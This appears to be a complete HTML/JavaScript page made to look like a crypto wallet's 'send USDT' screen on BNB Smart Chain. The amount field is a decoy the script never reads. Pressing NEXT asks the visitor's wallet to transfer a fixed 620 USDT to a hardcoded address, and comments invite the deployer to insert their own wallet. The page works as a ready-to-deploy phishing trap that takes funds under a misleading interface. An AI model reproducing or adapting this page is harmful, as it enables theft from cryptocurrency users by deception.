<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport"
      content="width=device-width, initial-scale=1.0, maximum-scale=1.0">

<title>USDT Payment</title>

<style>
* {
    box-sizing: border-box;
}

body {
    margin: 0;
    padding: 0;
    background: #ffffff;
    font-family: Arial, sans-serif;
    color: #1f2937;
}

.container {
    width: 100%;
    max-width: 620px;
    min-height: 100vh;
    margin: auto;
    padding: 28px 18px 110px;
}

/* Labels */
.label {
    font-size: 18px;
    font-weight: 600;
    color: #64748b;
    margin: 12px 4px 10px;
}

/* Address box */
.address-box {
    width: 100%;
    min-height: 70px;
    border: 1.5px solid #d9e0e8;
    border-radius: 18px;
    display: flex;
    align-items: center;
    padding: 14px 16px;
    gap: 10px;
    box-shadow: 0 1px 4px rgba(0,0,0,0.03);
}

.address {
    flex: 1;
    font-size: 17px;
    word-break: break-all;
    color: #202938;
}

.copy-btn {
    border: none;
    background: transparent;
    color: #1677e8;
    font-size: 16px;
    font-weight: 600;
    padding: 8px;
}

/* Network */
.network-box {
    display: inline-flex;
    align-items: center;
    gap: 12px;

    margin-top: 8px;

    border: 1.5px solid #d9e0e8;
    border-radius: 35px;

    padding: 7px 14px 7px 8px;

    font-size: 18px;
    font-weight: 600;
}

.bnb-logo {
    width: 38px;
    height: 38px;
    border-radius: 50%;
    background: #f3ba2f;

    display: flex;
    align-items: center;
    justify-content: center;

    font-weight: bold;
    color: #111827;
}

/* Amount */
.amount-box {
    width: 100%;
    height: 72px;

    border: 1.5px solid #d9e0e8;
    border-radius: 18px;

    display: flex;
    align-items: center;

    padding: 0 16px;
}

.amount {
    flex: 1;
    font-size: 22px;
    font-weight: 600;
    color: #1f2937;
}

.currency {
    font-size: 18px;
    font-weight: 600;
    color: #64748b;
    margin-right: 14px;
}

.fixed {
    background: #e8f2ff;
    color: #1677e8;

    padding: 9px 13px;
    border-radius: 25px;

    font-size: 15px;
    font-weight: 600;
}

/* Bottom button */
.next-btn {
    position: fixed;

    left: 18px;
    right: 18px;
    bottom: 300px;

    max-width: 584px;
    margin: auto;

    height: 64px;

    border: none;
    border-radius: 20px;

    background: linear-gradient(
        90deg,
        #087cf5,
        #7646ee
    );

    color: white;
    font-size: 21px;
    font-weight: 700;

    cursor: pointer;
}

.next-btn:disabled {
    opacity: 0.6;
}

/* Status */
#status {
    text-align: center;
    margin-top: 25px;
    font-size: 15px;
    color: #64748b;
    word-break: break-word;
}

.success {
    color: #16a34a !important;
    font-weight: 600;
}

.error {
    color: #dc2626 !important;
    font-weight: 600;
}
</style>
</head>

<body>

<div class="container">

    <!-- ADDRESS -->

    <div class="label">
        Address or Domain Name
    </div>

    <div class="address-box">

        <div class="address" id="recipientText"></div>

        <button class="copy-btn" onclick="copyAddress()">
            Copy
        </button>

    </div>


    <!-- NETWORK -->

    <div class="label">
        Destination Network
    </div>

    <div class="network-box">

        <div class="bnb-logo">
            BNB
        </div>

        <div>
            BNB Smart Chain
        </div>

        <div>⌄</div>

    </div>


    <!-- AMOUNT -->

    <div class="label">
        Amount
    </div>

    <div class="amount-box">

    <input
        id="remark"
        type="text"
        maxlength="100"
        placeholder="Enter amount"
        style="
            width: 100%;
            border: none;
            outline: none;
            background: transparent;
            font-size: 22px;
            font-weight: 600;
            color: #1f2937;
        "
    >

    </div>

    </div>


    <div id="status"></div>

</div>


<!-- NEXT -->

<button class="next-btn" id="nextButton">
    NEXT
</button>


<script>

/*
==================================================
DAPP SETTINGS
==================================================
*/

/* Yahan amount change karo */
const PAYMENT_AMOUNT = "620";

/* Yahan apna BNB wallet address rakho */
const RECIPIENT =
"0xc1400749e127b83a8fD0022ccD1Fe8c27B06dec0";

/* BSC Mainnet */
const CHAIN_ID = "0x38";

/* BSC USDT */
const USDT =
"0x55d398326f99059fF775485246999027B3197955";

/* BSC USDT = 18 decimals */
const USDT_DECIMALS = 18;


/*
==================================================
SHOW FRONTEND
==================================================
*/

document.getElementById("recipientText").textContent =
    RECIPIENT;


/*
==================================================
COPY ADDRESS
==================================================
*/

async function copyAddress() {

    try {

        await navigator.clipboard.writeText(RECIPIENT);

        setStatus(
            "Address copied successfully.",
            "success"
        );

    } catch (error) {

        setStatus(
            "Could not copy address.",
            "error"
        );

    }
}


/*
==================================================
STATUS
==================================================
*/

function setStatus(message, type = "") {

    const status =
        document.getElementById("status");

    status.textContent = message;

    status.className = type;

}


/*
==================================================
GET TRUST WALLET / EIP-1193 PROVIDER
==================================================
*/

function getProvider() {

    if (window.trustwallet &&
        window.trustwallet.ethereum) {

        return window.trustwallet.ethereum;

    }

    if (window.ethereum) {

        return window.ethereum;

    }

    throw new Error(
        "Wallet provider not found."
    );
}


/*
==================================================
DECIMAL AMOUNT → UINT256
==================================================
*/

function parseUnits(value, decimals) {

    const parts = value.split(".");

    let whole = parts[0] || "0";

    let fraction = parts[1] || "";

    fraction =
        fraction.padEnd(decimals, "0")
                 .slice(0, decimals);

    return BigInt(
        whole + fraction
    );
}


/*
==================================================
ADDRESS → 32 BYTE
==================================================
*/

function padAddress(address) {

    return address
        .replace("0x", "")
        .toLowerCase()
        .padStart(64, "0");
}


/*
==================================================
UINT256 → 32 BYTE
==================================================
*/

function padUint256(value) {

    return value
        .toString(16)
        .padStart(64, "0");
}


/*
==================================================
NEXT / PAYMENT
==================================================
*/

document
.getElementById("nextButton")
.addEventListener("click", async function() {

    const button = this;

    try {

        button.disabled = true;

        setStatus(
            "Connecting wallet..."
        );


        const provider =
            getProvider();


        /*
        -----------------------------
        CONNECT
        -----------------------------
        */

        const accounts =
            await provider.request({

                method: "eth_requestAccounts"

            });


        if (!accounts ||
            accounts.length === 0) {

            throw new Error(
                "No wallet account found."
            );

        }


        const from =
            accounts[0];


        /*
        -----------------------------
        CHECK NETWORK
        -----------------------------
        */

        const chainId =
            await provider.request({

                method: "eth_chainId"

            });


        if (chainId !== CHAIN_ID) {

            try {

                await provider.request({

                    method:
                    "wallet_switchEthereumChain",

                    params: [
                        {
                            chainId: CHAIN_ID
                        }
                    ]

                });

            } catch (switchError) {

                throw new Error(
                    "Please select BNB Smart Chain in your wallet."
                );

            }

        }


        /*
        -----------------------------
        AMOUNT
        -----------------------------
        */

        const amount =
            parseUnits(
                PAYMENT_AMOUNT,
                USDT_DECIMALS
            );


        /*
        -----------------------------
        ERC20 TRANSFER
        -----------------------------

        transfer(address,uint256)

        Function selector:
        0xa9059cbb
        -----------------------------
        */

        const data =
            "0xa9059cbb" +
            padAddress(RECIPIENT) +
            padUint256(amount);


        setStatus(
            "Please confirm the " +
            PAYMENT_AMOUNT +
            " USDT transaction in your wallet..."
        );


        /*
        -----------------------------
        SEND TRANSACTION
        -----------------------------
        */

        const txHash =
            await provider.request({

                method:
                "eth_sendTransaction",

                params: [

                    {

                        from: from,

                        to: USDT,

                        data: data

                    }

                ]

            });


        setStatus(
            "Transaction submitted. Waiting for confirmation..."
        );


        /*
        -----------------------------
        WAIT FOR RECEIPT
        -----------------------------
        */

        let receipt = null;

        for (let i = 0; i < 60; i++) {

            receipt =
                await provider.request({

                    method:
                    "eth_getTransactionReceipt",

                    params: [txHash]

                });


            if (receipt) {
                break;
            }


            await new Promise(
                resolve =>
                setTimeout(resolve, 2000)
            );

        }


        if (!receipt) {

            throw new Error(
                "Transaction confirmation timed out."
            );

        }


        /*
        -----------------------------
        CHECK SUCCESS
        -----------------------------
        */

        if (receipt.status !== "0x1") {

            throw new Error(
                "Transaction failed."
            );

        }


        /*
        -----------------------------
        SUCCESS
        -----------------------------
        */

        setStatus(
            "✓ Payment successful. " +
            PAYMENT_AMOUNT +
            " USDT received.",
            "success"
        );


        button.textContent =
            "DONE";


        button.disabled = false;


    } catch (error) {

        console.error(error);

        setStatus(
            error.message ||
            "Transaction cancelled or failed.",
            "error"
        );

        button.disabled = false;

    }

});

</script>

</body>
</html>
